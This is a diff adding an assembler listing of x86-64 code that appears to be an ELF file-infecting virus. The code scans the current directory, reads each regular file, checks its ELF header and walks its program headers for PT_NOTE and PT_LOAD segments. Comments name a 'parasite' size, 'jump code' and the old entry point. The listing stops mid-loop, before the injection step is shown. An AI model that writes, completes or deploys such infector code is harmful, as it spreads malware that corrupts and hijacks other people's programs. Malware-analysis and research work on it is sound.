@@ -1,0 +1,1831 @@
+GAS LISTING ./reverse_text.s 			page 1
+
+
+   1              	.section .text
+   2              	.globl _start
+   3              	_start:
+   4 0000 50       	push %rax
+   5 0001 53       	push %rbx
+   6 0002 51       	push %rcx
+   7 0003 52       	push %rdx
+   8 0004 57       	push %rdi
+   9 0005 56       	push %rsi
+  10 0006 4150     	push %r8
+  11 0008 4151     	push %r9
+  12 000a 4152     	push %r10
+  13 000c 4153     	push %r11
+  14 000e 4154     	push %r12
+  15 0010 4155     	push %r13
+  16 0012 4156     	push %r14
+  17 0014 4157     	push %r15
+  18 0016 9C       	pushfq
+  19              	
+  20 0017 55       	push %rbp
+  21 0018 4889E5   	mov %rsp,%rbp
+  22 001b 4881EC00 	subq $0X1000,%rsp
+  22      100000
+  23 0022 4883E4F0 	andq $0xfffffffffffffff0,%rsp
+  24              	/*address_of_main(void*,0x08,-0x08(%rbp)),parasite_size(unsigned long ,0x08,-0x10(%rbp)),lret(long,
+  25              	/*,debugMsg1(char[32],0x20,-0x58(%rbp)),dd (uint32_t,0x04,-0x5c(%rbp)),pading(0x02,-0x5e(%rbp)),cwd
+  26              	/*nread(long,0x08,-0x468(%rbp)),d (linux_dirent64*,0x08, -0x470(%rbp)),bpos(int,0x04,-0x474(%rbp)),
+  27              	/* debugMsg3(char[0x400],0x400,-0x878(%rbp)),d_name(void*,0x08,-0x880(%rbp)),dname_fd(unsigned long
+  28              	/*basic_brk(void*,0x08,-0x920(%rbp)) file_mem(byte *,0x08,-0x928(%rbp)),dname_ehdr(Elf64_Ehdr *,0x0
+  29              	/*dname_phnum(short,0x02,-0x93a(%rbp)),i(int,0x04,-0x93e(%rbp)),pading (,0x02,-0x940(%rbp)),p_phdr_
+  30              	/*pading(,0x04,-0x950(%rbp)),base_addr(Elf64_Addr,0x08,-0x958(%rbp)),obj_pgsize(unsigned long,0x08,
+  31              	/*f_first_noteseg(int,0x04,-0x96c(%rbp)) pading(,0x04,-0x970(%rbp)),dname_filesz(ulong,0x08,-0x978(
+  32              	/*p_maxvaddr_ldseg(Elf64_Phdr*,0x08,-0x988(%rbp)),ldseg_maxaddr(ulong,0x08,-0x990(%rbp)),dname_shdr
+  33              	/*new_sec_vaddr(ulong,0x08,-0x9a8(%rbp)),new_fd(long,0x08,-0x9b0(%rbp)),new_shent_size(ulong ,0x08,
+  34              	/*jump_code(byte[0x10],0x10,-0x9d0(%rbp))*/
+  35 0026 48C745F8 	movq $0,-0x08(%rbp)
+  35      00000000 
+  36 002e 48C745F0 	movq $0,-0x10(%rbp)
+  36      00000000 
+  37 0036 48C745E8 	movq $0,-0x18(%rbp)
+  37      00000000 
+  38              	#cmpq $0x1234567890,osis_reverse_parasite_size
+  39              	#jne .osis_get_entry 
+  40              	#/*movq $_start,-0x08(%rbp) 直接寻址*/
+  41 003e 488D0500 	leaq _start(%rip), %rax  # 先加载到寄存器 rip寻址
+  41      000000
+  42 0045 488945F8 	movq %rax, -0x08(%rbp)   # 再移动到内存位置
+  43 0049 488D0D40 	leaq ._start_endl_exit(%rip),%rcx
+  43      0D0000
+  44 0050 4829C1   	subq %rax,%rcx
+  45 0053 48894DF0 	mov %rcx,-0x10(%rbp)
+  46              	.osis_get_entry:
+  47              	
+  48              	#addq $0xa,-0x10(%rbp)
+  49              	
+  50              	###################### 01 print debugMsg#################
+  51 0057 488D7DC8 	leaq -0x38(%rbp),%rdi
+GAS LISTING ./reverse_text.s 			page 2
+
+
+  52 005b 48C7C600 	mov $0,%rsi
+  52      000000
+  53 0062 48C7C220 	mov $0x20,%rdx
+  53      000000
+  54 0069 E8000000 	call osis_memset_rax
+  54      00
+  55              	
+  56 006e 488D7DA8 	leaq -0x58(%rbp),%rdi
+  57 0072 48C7C600 	mov $0,%rsi
+  57      000000
+  58 0079 48C7C220 	mov $0x20,%rdx
+  58      000000
+  59 0080 E8000000 	call osis_memset_rax
+  59      00
+  60              	
+  61 0085 488D45C8 	leaq -0x38(%rbp),%rax 
+  62 0089 C60054   	movb $0x54,(%rax)   #T
+  63 008c C6400168 	movb $0x68,1(%rax)  #h
+  64 0090 C6400265 	movb $0x65,2(%rax)  #e
+  65 0094 C6400320 	movb $0x20,3(%rax)  #space
+  66 0098 C6400465 	movb $0x65,4(%rax)  #e
+  67 009c C640056E 	movb $0x6e,5(%rax)  #n
+  68 00a0 C6400674 	movb $0x74,6(%rax)  #t
+  69 00a4 C6400772 	movb $0x72,7(%rax)  #r
+  70 00a8 C6400879 	movb $0x79,8(%rax)  #y
+  71 00ac C640093A 	movb $0x3a,9(%rax)  #:
+  72 00b0 C6400A25 	movb $0x25,10(%rax) #%
+  73 00b4 C6400B78 	movb $0x78,11(%rax)  #x
+  74 00b8 C6400C0A 	movb $0x0a,12(%rax)  #\n
+  75 00bc C6400D00 	movb $0x00,13(%rax)  #0
+  76              	
+  77 00c0 488D7DA8 	leaq -0x58(%rbp), %rdi
+  78 00c4 48C7C61F 	mov $31,%rsi
+  78      000000
+  79 00cb 488D55C8 	leaq -0x38(%rbp),%rdx  
+  80 00cf 488B4DF8 	mov -0x08(%rbp),%rcx
+  81 00d3 E8000000 	call osis_snprintf
+  81      00
+  82              	
+  83 00d8 48C7C001 	mov $1,%rax #write
+  83      000000
+  84 00df 48C7C701 	mov $1,%rdi #stdout
+  84      000000
+  85 00e6 488D75A8 	leaq -0x58(%rbp),%rsi
+  86 00ea 48C7C21F 	mov $31,%rdx
+  86      000000
+  87 00f1 0F05     	syscall
+  88              	###################### end of 01 print debugMsg#################
+  89              	
+  90 00f3 488D45A0 	leaq -0x60(%rbp),%rax
+  91 00f7 C6002E   	movb $0x2e,(%rax)
+  92 00fa C6400100 	movb $0x00,1(%rax)
+  93              	
+  94 00fe 48C7C002 	mov $2,%rax #open
+  94      000000
+  95 0105 488D7DA0 	leaq -0x60(%rbp),%rdi
+  96 0109 48C7C600 	mov $0x10000,%rsi #O_RDONLY | O_DIRECTORY 00000000|00200000=00200000=0x10000
+GAS LISTING ./reverse_text.s 			page 3
+
+
+  96      000100
+  97 0110 48C7C200 	mov $0,%rdx
+  97      000000
+  98 0117 0F05     	syscall
+  99 0119 4885C0   	test %rax,%rax
+ 100 011c 0F884E0C 	js ._start_endl 
+ 100      0000
+ 101 0122 488945A4 	mov %rax,-0x5c(%rbp) 
+ 102              	
+ 103              	._start_get_dirent:
+ 104 0126 48C7C0D9 	    mov $217,%rax # SYS_getdents64
+ 104      000000
+ 105 012d 488B7DA4 	    mov -0x5c(%rbp),%rdi
+ 106 0131 488DB5A0 	    leaq -0x460(%rbp),%rsi#buff
+ 106      FBFFFF
+ 107 0138 48C7C200 	    mov $0x400,%rdx
+ 107      040000
+ 108 013f 0F05     	    syscall
+ 109 0141 4885C0   	    test %rax,%rax
+ 110 0144 0F88260C 	    js ._start_endl
+ 110      0000
+ 111 014a 0F849608 	    jz ._start_out_get_dirent 
+ 111      0000
+ 112 0150 48898598 	    mov %rax,-0x468(%rbp) #nread
+ 112      FBFFFF
+ 113 0157 C7858CFB 	    movl $0,-0x474(%rbp)#bpos
+ 113      FFFF0000 
+ 113      0000
+ 114              	    ._start_out_get_dirent_bpos:
+ 115 0161 488B9598 	        mov -0x468(%rbp),%rdx #nread
+ 115      FBFFFF
+ 116 0168 448B8D8C 	        movl -0x474(%rbp),%r9d #bpos movl auto zero-extend 0 to rax
+ 116      FBFFFF
+ 117 016f 4C39CA   	        cmpq %r9,%rdx
+ 118 0172 0F8E6908 	        jle ._start_out_get_dirent_bpos_out
+ 118      0000
+ 119 0178 488DB5A0 	        leaq  -0x460(%rbp),%rsi
+ 119      FBFFFF
+ 120 017f 4901F1   	        addq %rsi,%r9
+ 121 0182 4C898D90 	        movq %r9,-0x470(%rbp) 
+ 121      FBFFFF
+ 122              	        /*struct linux_dirent64* 
+ 123              	                  8               8                 2                    1                
+ 124              	        (unsigned long ino  long offset unsigned short d_reclen  unsigned char d_type   char d_naem
+ 125              	        */
+ 126 0189 4D31C0   	        xor %r8,%r8
+ 127 018c 66458B41 	        mov 0x10(%r9),%r8w #d->d_reclen
+ 127      10
+ 128 0191 4D31D2   	        xor %r10,%r10
+ 129 0194 448B958C 	        mov -0x474(%rbp),%r10d #bpos 
+ 129      FBFFFF
+ 130 019b 4501C2   	        addl %r8d,%r10d
+ 131 019e 4489958C 	        movl %r10d,-0x474(%rbp) #bpos += d->d_reclen
+ 131      FBFFFF
+ 132              	        ###################### 02 print debugMsg#################
+ 133 01a5 488DBD88 	        leaq -0x878(%rbp),%rdi  #debugMsg3(char[0x400],-0x878(%rbp))
+ 133      F7FFFF
+GAS LISTING ./reverse_text.s 			page 4
+
+
+ 134 01ac 48C7C600 	        mov $0,%rsi
+ 134      000000
+ 135 01b3 48C7C200 	        mov $0x400,%rdx
+ 135      040000
+ 136 01ba E8000000 	        call osis_memset_rax
+ 136      00
+ 137              	
+ 138 01bf 488D7DA8 	        leaq -0x58(%rbp),%rdi
+ 139 01c3 48C7C600 	        mov $0,%rsi
+ 139      000000
+ 140 01ca 48C7C220 	        mov $0x20,%rdx
+ 140      000000
+ 141 01d1 E8000000 	        call osis_memset_rax
+ 141      00
+ 142              	
+ 143 01d6 488D45A8 	        leaq -0x58(%rbp),%rax 
+ 144 01da C60054   	        movb $0x54,(%rax)   #T
+ 145 01dd C6400168 	        movb $0x68,1(%rax)  #h
+ 146 01e1 C6400265 	        movb $0x65,2(%rax)  #e
+ 147 01e5 C6400320 	        movb $0x20,3(%rax)  #space
+ 148 01e9 C6400466 	        movb $0x66,4(%rax)  #f
+ 149 01ed C640056E 	        movb $0x6e,5(%rax)  #n
+ 150 01f1 C6400661 	        movb $0x61,6(%rax)  #a
+ 151 01f5 C640076D 	        movb $0x6d,7(%rax)  #m
+ 152 01f9 C6400865 	        movb $0x65,8(%rax)  #e
+ 153 01fd C640093A 	        movb $0x3a,9(%rax)  #:
+ 154 0201 C6400A25 	        movb $0x25,10(%rax) #%
+ 155 0205 C6400B73 	        movb $0x73,11(%rax)  #s
+ 156 0209 C6400C0A 	        movb $0x0a,12(%rax)  #\n
+ 157 020d C6400D00 	        movb $0x00,13(%rax)  #0
+ 158              	
+ 159 0211 488DBD88 	        leaq -0x878(%rbp), %rdi
+ 159      F7FFFF
+ 160 0218 48C7C600 	        mov $0x400,%rsi
+ 160      040000
+ 161 021f 488D55A8 	        leaq -0x58(%rbp),%rdx 
+ 162 0223 4C8B8D90 	        mov -0x470(%rbp) ,%r9
+ 162      FBFFFF
+ 163 022a 498D4913 	        lea 0x13(%r9),%rcx
+ 164 022e E8000000 	        call osis_snprintf
+ 164      00
+ 165              	
+ 166 0233 48C7C001 	        mov $1,%rax #write
+ 166      000000
+ 167 023a 48C7C701 	        mov $1,%rdi #stdout
+ 167      000000
+ 168 0241 488DB588 	        leaq -0x878(%rbp),%rsi
+ 168      F7FFFF
+ 169 0248 48C7C200 	        mov $0x400,%rdx
+ 169      040000
+ 170 024f 0F05     	        syscall 
+ 171 0251 4C8B8D90 	        mov -0x470(%rbp) ,%r9
+ 171      FBFFFF
+ 172              	        ###################### end of 02 print debugMsg#################
+ 173              	
+ 174 0258 4D31C0   	        xor %r8,%r8
+ 175 025b 458A4112 	        mov 0x12(%r9),%r8b  #d->d_type
+GAS LISTING ./reverse_text.s 			page 5
+
+
+ 176 025f 4488858B 	        movb %r8b,-0x475(%rbp)
+ 176      FBFFFF
+ 177              	
+ 178 0266 4180F808 	        cmpb $0x08,%r8b #DT_REG 普通文件
+ 179 026a 744D     	        je ._start_out_get_dirent_bpos_cmp1
+ 180 026c 4180F804 	        cmpb $0x04,%r8b #DT_DIR
+ 181 0270 0F85EBFE 	        jne ._start_out_get_dirent_bpos 
+ 181      FFFF
+ 182 0276 4831FF   	        xor %rdi,%rdi
+ 183 0279 66418B79 	        mov 0x10(%r9), %di #d_reclen
+ 183      10
+ 184 027e 6683FF18 	        cmpw $0x18,%di
+ 185 0282 0F8CD9FE 	        jl ._start_out_get_dirent_bpos 
+ 185      FFFF
+ 186              	        
+ 187 0288 4D31C0   	        xor %r8,%r8
+ 188 028b 66458B41 	        mov 0x13(%r9),%r8w
+ 188      13
+ 189 0290 664183F8 	        cmpw $0x2e,%r8w #. ascii 0x46 r9w=0x002e .文件夹
+ 189      2E
+ 190 0295 0F84C6FE 	        je ._start_out_get_dirent_bpos
+ 190      FFFF
+ 191 029b 458B4113 	        movl 0x13(%r9),%r8d
+ 192 029f 4181E02E 	        and $0x002e2e,%r8d
+ 192      2E0000
+ 193 02a6 4181F82E 	        cmpl $0x002e2e,%r8d #..目录
+ 193      2E0000
+ 194 02ad 0F84AEFE 	        je  ._start_out_get_dirent_bpos
+ 194      FFFF
+ 195              	        /*可以添加代码递归新目录 待完成*/
+ 196              	        /*********************************/
+ 197 02b3 0F85A8FE 	        jne  ._start_out_get_dirent_bpos 
+ 197      FFFF
+ 198              	        ._start_out_get_dirent_bpos_cmp1:
+ 199              	        /*****************处理普通文件 process DT_REG*********/
+ 200 02b9 498D7913 	        leaq  0x13(%r9),%rdi #d->d_name
+ 201 02bd 4889BD80 	        movq  %rdi, -0x880(%rbp)
+ 201      F7FFFF
+ 202 02c4 BE000000 	        movl $0,%esi    #O_RDONLY movl will auto 0-extend rsi 
+ 202      00
+ 203 02c9 48C7C002 	        movq $2,%rax #open
+ 203      000000
+ 204 02d0 0F05     	        syscall
+ 205 02d2 4885C0   	        test %rax,%rax
+ 206 02d5 0F8886FE 	        js ._start_out_get_dirent_bpos 
+ 206      FFFF
+ 207 02db 48898578 	        mov %rax,-0x888(%rbp) #store dname_fd
+ 207      F7FFFF
+ 208              	        
+ 209 02e2 488BBD80 	        movq -0x880(%rbp),%rdi #d->d_name 
+ 209      F7FFFF
+ 210 02e9 488DB5E8 	        leaq  -0x918(%rbp),%rsi #struct stat*st
+ 210      F6FFFF
+ 211              	         /*
+ 212              	        struct stat {
+ 213              	                        __kernel_ulong_t	st_dev;
+ 214              	                        __kernel_ulong_t	st_ino;
+GAS LISTING ./reverse_text.s 			page 6
+
+
+ 215              	                        __kernel_ulong_t	st_nlink;
+ 216              	
+ 217              	                        unsigned int		st_mode;
+ 218              	                        unsigned int		st_uid;
+ 219              	                        unsigned int		st_gid;
+ 220              	                        unsigned int		__pad0;
+ 221              	                        __kernel_ulong_t	st_rdev;
+ 222              	                        __kernel_long_t		st_size;
+ 223              	                        __kernel_long_t		st_blksize;
+ 224              	                        __kernel_long_t		st_blocks;
+ 225              	
+ 226              	                        __kernel_ulong_t	st_atime;
+ 227              	                        __kernel_ulong_t	st_atime_nsec;
+ 228              	                        __kernel_ulong_t	st_mtime;
+ 229              	                        __kernel_ulong_t	st_mtime_nsec;
+ 230              	                        __kernel_ulong_t	st_ctime;
+ 231              	                        __kernel_ulong_t	st_ctime_nsec;
+ 232              	                        __kernel_long_t		__unused[3];
+ 233              	                    };
+ 234              	 
+ 235              	         */
+ 236 02f0 48C7C004 	        mov $4,%rax #stat
+ 236      000000
+ 237 02f7 0F05     	        syscall
+ 238 02f9 4885C0   	        test %rax,%rax
+ 239 02fc 7915     	        jns ._start_out_get_dirent_bpos_stat_1_continue
+ 240 02fe 488BBD78 	        mov -0x888(%rbp),%rdi # dname_fd
+ 240      F7FFFF
+ 241 0305 48C7C003 	        mov $0x03,%rax #close
+ 241      000000
+ 242 030c 0F05     	        syscall
+ 243 030e E94EFEFF 	        jmp ._start_out_get_dirent_bpos 
+ 243      FF
+ 244              	
+ 245              	        ._start_out_get_dirent_bpos_stat_1_continue:
+ 246              	         /*
+ 247              	         mov $0,%rdi
+ 248              	         mov $12,%rax #brk
+ 249              	         syscall
+ 250              	         test %rax,%rax
+ 251              	         je ._start_out_get_dirent_bpos_brk_1_err
+ 252              	         cmp $-1,%rax
+ 253              	         je ._start_out_get_dirent_bpos_brk_1_err
+ 254              	         jmp ._start_out_get_dirent_bpos_brk_1_continue: 
+ 255              	         ._start_out_get_dirent_bpos_brk_1_err: 
+ 256              	         mov -0x888(%rbp),%rdi # dname_fd
+ 257              	         mov $0x03,%rax #close
+ 258              	         syscall
+ 259              	         jmp ._start_out_get_dirent_bpos  
+ 260              	         */
+ 261 0313 48C7C700 	         mov $0,%rdi
+ 261      000000
+ 262 031a E8000000 	         call osis_sbrk
+ 262      00
+ 263 031f 4883F8FF 	         cmp $-1,%rax
+ 264 0323 742D     	         je ._start_out_get_dirent_bpos_brk_1_err
+ 265 0325 488985E0 	         mov %rax,-0x920(%rbp) #basic_brk
+GAS LISTING ./reverse_text.s 			page 7
+
+
+ 265      F6FFFF
+ 266              	         
+ 267 032c 488D85E8 	         lea -0x918(%rbp),%rax   #dname_fd_st( struct stat,0x90, -0x918(%rbp))
+ 267      F6FFFF
+ 268 0333 488B7830 	         mov 0x30(%rax),%rdi #st.st_size
+ 269 0337 E8000000 	         call osis_sbrk
+ 269      00
+ 270 033c 4883F8FF 	         cmp $-1,%rax
+ 271 0340 7410     	         je ._start_out_get_dirent_bpos_brk_1_err
+ 272 0342 488BB5E0 	         mov -0x920(%rbp),%rsi
+ 272      F6FFFF
+ 273 0349 4889B5D8 	         mov %rsi,-0x928(%rbp) #file_mem(byte *,0x08,-0x928(%rbp))
+ 273      F6FFFF
+ 274 0350 EB15     	         jmp ._start_out_get_dirent_bpos_brk_1_continue 
+ 275              	
+ 276              	         ._start_out_get_dirent_bpos_brk_1_err: 
+ 277 0352 488BBD78 	         mov -0x888(%rbp),%rdi # dname_fd
+ 277      F7FFFF
+ 278 0359 48C7C003 	         mov $0x03,%rax #close
+ 278      000000
+ 279 0360 0F05     	         syscall
+ 280 0362 E9FAFDFF 	         jmp ._start_out_get_dirent_bpos
+ 280      FF
+ 281              	
+ 282              	         ._start_out_get_dirent_bpos_brk_1_continue:
+ 283 0367 488BBD78 	         mov -0x888(%rbp),%rdi #dname_fd
+ 283      F7FFFF
+ 284 036e 488BB5D8 	         mov -0x928(%rbp),%rsi #file_mem
+ 284      F6FFFF
+ 285 0375 488D85E8 	         lea -0x918(%rbp), %rax#dname_fd_st
+ 285      F6FFFF
+ 286 037c 488B5030 	         mov 0x30(%rax),%rdx   #st.st_size#
+ 287 0380 48C7C000 	         mov $0,%rax # read 
+ 287      000000
+ 288 0387 0F05     	         syscall
+ 289 0389 4883F8FF 	         cmp $-1,%rax
+ 290 038d 7521     	         jne ._start_out_get_dirent_bpos_read_1_contine
+ 291              	
+ 292              	         _start_out_get_dirent_bpos_read_1_err:
+ 293 038f 488BBD78 	         mov -0x888(%rbp),%rdi # dname_fd
+ 293      F7FFFF
+ 294 0396 48C7C003 	         mov $0x03,%rax #close
+ 294      000000
+ 295 039d 0F05     	         syscall
+ 296 039f 488BBDE0 	         mov -0x920(%rbp),%rdi # basic_brk
+ 296      F6FFFF
+ 297 03a6 E8000000 	         call osis_brk
+ 297      00
+ 298 03ab E9B1FDFF 	         jmp ._start_out_get_dirent_bpos
+ 298      FF
+ 299              	         
+ 300              	         ._start_out_get_dirent_bpos_read_1_contine:
+ 301 03b0 48899588 	         mov %rdx,-0x978(%rbp) #dname_filesz,0x08
+ 301      F6FFFF
+ 302 03b7 488BB5D8 	         mov -0x928(%rbp),%rsi 
+ 302      F6FFFF
+ 303 03be 4889B5D0 	         mov  %rsi,-0x930(%rbp) #dname_ehdr( Elf64_Ehdr *)
+GAS LISTING ./reverse_text.s 			page 8
+
+
+ 303      F6FFFF
+ 304              	         
+ 305              	         #   typedef struct
+ 306              	         #   {
+ 307              	         #   unsigned char	e_ident[16];	/* Magic number and other info */
+ 308              	         #   Elf64_Half	e_type;			/* Object file type */
+ 309              	         #   Elf64_Half	e_machine;		/* Architecture */
+ 310              	         #   Elf64_Word	e_version;		/* Object file version */
+ 311              	         #   Elf64_Addr	e_entry;		/* Entry point virtual address */
+ 312              	         #   Elf64_Off	e_phoff;		/* Program header table file offset */
+ 313              	         #   Elf64_Off	e_shoff;		/* Section header table file offset */
+ 314              	         #   Elf64_Word	e_flags;		/* Processor-specific flags */
+ 315              	         #   Elf64_Half	e_ehsize;		/* ELF header size in bytes */
+ 316              	         #   Elf64_Half	e_phentsize;		/* Program header table entry size */
+ 317              	         #   Elf64_Half	e_phnum;		/* Program header table entry count */
+ 318              	         #   Elf64_Half	e_shentsize;		/* Section header table entry size */
+ 319              	         #   Elf64_Half	e_shnum;		/* Section header table entry count */
+ 320              	         #   Elf64_Half	e_shstrndx;		/* Section header string table index */
+ 321              	         #   } Elf64_Ehdr;
+ 322              	         ._start_out_get_dirent_bpos_check_elf_hdr_1:
+ 323 03c5 8B06     	         movl (%rsi),%eax
+ 324 03c7 3D7F454C 	         cmp $0x464c457f,%eax
+ 324      46
+ 325 03cc 7517     	         jne ._start_out_get_dirent_bpos_check_elf_hdr_1_fail
+ 326 03ce 8A4604   	         movb 0x04(%rsi),%al
+ 327 03d1 3C02     	         cmpb $0x02,%al  #EI_CLASS 02 X64
+ 328 03d3 7510     	         jne ._start_out_get_dirent_bpos_check_elf_hdr_1_fail
+ 329 03d5 668B4610 	         movw 0x10(%rsi),%ax
+ 330 03d9 6683F802 	         cmp $02,%ax #dname_ehdr->e_type
+ 331              	         #jne ._start_out_get_dirent_bpos_check_elf_hdr_1_fail     
+ 332 03dd 7427     	         je ._start_out_get_dirent_bpos_check_elf_hdr_1_succ
+ 333 03df 6683F803 	         cmp $03,%ax 
+ 334 03e3 7421     	         je ._start_out_get_dirent_bpos_check_elf_hdr_1_succ 
+ 335              	
+ 336              	         ._start_out_get_dirent_bpos_check_elf_hdr_1_fail:
+ 337 03e5 488BBD78 	         mov -0x888(%rbp),%rdi # dname_fd
+ 337      F7FFFF
+ 338 03ec 48C7C003 	         mov $0x03,%rax #close
+ 338      000000
+ 339 03f3 0F05     	         syscall
+ 340 03f5 488BBDE0 	         mov -0x920(%rbp),%rdi # basic_brk
+ 340      F6FFFF
+ 341 03fc E8000000 	         call osis_brk
+ 341      00
+ 342 0401 E95BFDFF 	         jmp ._start_out_get_dirent_bpos
+ 342      FF
+ 343              	
+ 344              	        ._start_out_get_dirent_bpos_check_elf_hdr_1_succ:
+ 345              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr:
+ 346 0406 488B4620 	        mov 0x20(%rsi),%rax #e_phoff
+ 347 040a 4883F800 	        cmp $0,%rax
+ 348 040e 0F8EA705 	        jle ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail
+ 348      0000
+ 349 0414 488D0406 	        lea (%rsi,%rax),%rax
+ 350 0418 488985C8 	        mov %rax,-0x938(%rbp)  #dname_phdr (Elf64_Phdr*)
+ 350      F6FFFF
+ 351              	
+GAS LISTING ./reverse_text.s 			page 9
+
+
+ 352 041f 488B4628 	        mov 0x28(%rsi),%rax #e_shoff
+ 353 0423 4883F800 	        cmp $0,%rax
+ 354 0427 0F8E8E05 	        jle ._start_out_get_dirent_bpos_anlasize_elf_phdr_fail
+ 354      0000
+ 355 042d 488D0406 	        lea (%rsi,%rax),%rax
+ 356 0431 48898568 	        mov %rax,-0x998(%rbp)  #dname_shdr (Elf64_Shdr*)
+ 356      F6FFFF
+ 357              	
+ 358              	        #typedef struct
+ 359              	        #{
+ 360              	        #Elf64_Word	p_type;			/* Segment type */ size:0x04
+ 361              	        #Elf64_Word	p_flags;		/* Segment flags */
+ 362              	        #Elf64_Off	p_offset;		/* Segment file offset */
+ 363              	        #Elf64_Addr	p_vaddr;		/* Segment virtual address */
+ 364              	        #Elf64_Addr	p_paddr;		/* Segment physical address */
+ 365              	        #Elf64_Xword	p_filesz;		/* Segment size in file */
+ 366              	        #Elf64_Xword	p_memsz;		/* Segment size in memory */
+ 367              	        #Elf64_Xword	p_align;		/* Segment alignment */
+ 368              	        #} Elf64_Phdr;
+ 369 0438 668B4E38 	        movw 0x38(%rsi),%cx #e_phnum 
+ 370 043c 66898DC6 	        movw %cx,-0x93a(%rbp)
+ 370      F6FFFF
+ 371 0443 488D85C2 	        lea -0x93e(%rbp),%rax #i
+ 371      F6FFFF
+ 372 044a 4831C9   	        xor %rcx,%rcx
+ 373 044d 8908     	        movl %ecx,(%rax)
+ 374 044f 898DB4F6 	        movl %ecx,-0x94c(%rbp)#f_first_loadseg
+ 374      FFFF
+ 375 0455 898D94F6 	        movl %ecx,-0x96c(%rbp)#f_first_noteseg,0x04
+ 375      FFFF
+ 376 045b 48898DA8 	        mov %rcx,-0x958(%rbp)# base_addr
+ 376      F6FFFF
+ 377 0462 48898D80 	        mov %rcx,-0x980(%rbp)#p_fist_loadseg,0x08
+ 377      F6FFFF
+ 378 0469 48898D78 	        mov %rcx,-0x988(%rbp)#p_maxvaddr_ldseg 
+ 378      F6FFFF
+ 379 0470 48898D70 	        mov %rcx,-0x990(%rbp)#ldseg_maxaddr
+ 379      F6FFFF
+ 380 0477 48898D60 	        mov %rcx,-0x9a0(%rbp)#pnew_shent
+ 380      F6FFFF
+ 381 047e 48898D58 	        mov %rcx,-0x9a8(%rbp)#new_sec_vaddr
+ 381      F6FFFF
+ 382 0485 48898D48 	        mov %rcx,-0x9b8(%rbp) #new_shent_size
+ 382      F6FFFF
+ 383 048c 48898D40 	        mov %rcx,-0x9c0(%rbp) #old_entry
+ 383      F6FFFF
+ 384              	
+ 385 0493 4C8B8DC8 	        mov -0x938(%rbp),%r9 #dname_phdr
+ 385      F6FFFF
+ 386 049a 4C898DB8 	        mov %r9,-0x948(%rbp)#p_phdr_ent
+ 386      F6FFFF
+ 387 04a1 48C7C100 	        mov $0x1000,%rcx
+ 387      100000
+ 388 04a8 48898DA0 	        mov %rcx,-0x960(%rbp)#obj_pgsize,0x08
+ 388      F6FFFF
+ 389 04af 48898D98 	        mov %rcx,-0x968(%rbp)#obj_align,0x08
+ 389      F6FFFF
+GAS LISTING ./reverse_text.s 			page 10
+
+
+ 390              	        
+ 391              	
+ 392              	
+ 393              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1:
+ 394 04b6 8B8DC2F6 	        movl -0x93e(%rbp),%ecx #i
+ 394      FFFF
+ 395 04bc 663B8DC6 	        cmpw -0x93a(%rbp),%cx
+ 395      F6FFFF
+ 396 04c3 0F833201 	        jae ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1_out 
+ 396      0000
+ 397 04c9 4C8B8DB8 	        mov -0x948(%rbp),%r9 #p_phdr_ent
+ 397      F6FFFF
+ 398 04d0 4C8B95D0 	        mov -0x930(%rbp),%r10#dname_ehdr
+ 398      F6FFFF
+ 399 04d7 4D31C0   	        xor %r8,%r8
+ 400 04da 66458B42 	        movw 0x36(%r10),%r8w #dname_ehdr->e_phentsize
+ 400      36
+ 401 04df 4831D2   	        xor %rdx,%rdx
+ 402 04e2 4885C9   	        test %rcx,%rcx
+ 403 04e5 7403     	        jz ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz 
+ 404 04e7 4C89C2   	        mov %r8,%rdx
+ 405              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz:
+ 406              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_1_jz_out:
+ 407 04ea 48FFC1   	        incq %rcx 
+ 408 04ed 898DC2F6 	        mov %ecx,-0x93e(%rbp)
+ 408      FFFF
+ 409 04f3 4D8D0C11 	        lea (%r9,%rdx),%r9 #Elf64_Phdr* p_phdr_ent
+ 410 04f7 4C898DB8 	        mov %r9,-0x948(%rbp)
+ 410      F6FFFF
+ 411 04fe 418B01   	        movl 0x00(%r9),%eax #p_phdr_ent->p_type
+ 412              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type:
+ 413 0501 83F801   	        cmp $1,%eax #PT_LOAD
+ 414 0504 7427     	        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load
+ 415 0506 83F804   	        cmp $4,%eax #PT_NOTE
+ 416 0509 7402     	        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note
+ 417 050b EBA9     	        jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
+ 418              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note:
+ 419 050d 8B8D94F6 	        movl -0x96c(%rbp),%ecx #f_first_noteseg
+ 419      FFFF
+ 420 0513 85C9     	        test %ecx,%ecx
+ 421 0515 7402     	        je ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note_test_1_out
+ 422 0517 EB9D     	        jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1
+ 423              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_note_test_1_out:
+ 424 0519 B9010000 	        movl $1,%ecx
+ 424      00
+ 425 051e 898D94F6 	        movl %ecx,-0x96c(%rbp)#f_first_noteseg,0x04
+ 425      FFFF
+ 426 0524 4C898D80 	        mov %r9,-0x980(%rbp) #p_fist_noteseg
+ 426      F6FFFF
+ 427 052b EB89     	        jmp ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_1 
+ 428              	        
+ 429              	        ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop_cmp_p_type_load: 
+ 430 052d 8B85B4F6 	        movl -0x94c(%rbp),%eax #f_first_loadseg
+ 430      FFFF
+ 431 0533 85C0     	        test %eax,%eax
+ 432 0535 7524     	        jne ._start_out_get_dirent_bpos_anlasize_elf_phdr_loop1_test_2_jne_out
+ 433 0537 B8010000 	        mov $1,%eax
+GAS LISTING ./reverse_text.s 			page 11
+
+
+ 433      00
+ 434 053c 8985B4F6 	        mov %eax,-0x94c(%rbp)#f_first_loadseg
+ 434      FFFF
+ 435 0542 498B4110 	        mov 0x10(%r9),%rax #p_phdr_ent->p_vaddr
